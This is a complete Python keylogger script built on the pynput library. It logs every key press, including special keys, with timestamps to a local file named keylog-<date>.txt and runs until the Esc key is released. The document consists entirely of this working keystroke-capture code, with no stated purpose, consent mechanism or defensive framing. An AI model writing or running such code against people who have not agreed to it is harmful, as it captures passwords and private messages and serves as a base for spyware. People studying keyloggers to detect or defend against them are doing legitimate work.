from pynput import keyboard
import logging
from datetime import datetime

# Configure logging to save keystrokes to a file
log_dir = ""  # You can specify a directory if needed
logging.basicConfig(filename=(log_dir + "keylog-" + datetime.now().strftime("%Y%m%d-%H%M%S") + ".txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info(f"'{key.char}'")
    except AttributeError:
        logging.info(f"Special key {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

if __name__ == '__main__':
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
